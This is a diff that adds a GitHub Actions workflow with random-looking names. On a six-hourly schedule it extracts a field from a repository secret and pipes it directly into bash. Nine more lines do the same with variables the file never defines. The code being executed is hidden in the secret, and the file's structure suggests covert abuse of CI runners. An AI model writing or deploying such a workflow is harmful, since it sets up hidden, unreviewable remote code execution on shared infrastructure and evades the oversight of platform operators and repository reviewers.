@@ -1,0 +1,26 @@
+name: wengjingshi1290
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wengjingshi1290
+        env:
+          nj7277: ${{ secrets.nj7277 }}
+        run: |
+          echo $nj7277 | jq -r .dg526 | /bin/bash
+          echo $olz85 | jq -r .oakp79873 | /bin/bash
+          echo $anaua151 | jq -r .ihyz0101 | /bin/bash
+          echo $wgqm79898 | jq -r .d67 | /bin/bash
+          echo $ksd7272 | jq -r .wer04 | /bin/bash
+          echo $onvqd93080 | jq -r .p66 | /bin/bash
+          echo $adil544 | jq -r .fnkeb4 | /bin/bash
+          echo $wodqc17223 | jq -r .iuq5322 | /bin/bash
+          echo $kyxjz14 | jq -r .lx794 | /bin/bash
+          echo $mmpan70951 | jq -r .n3384 | /bin/bash
+
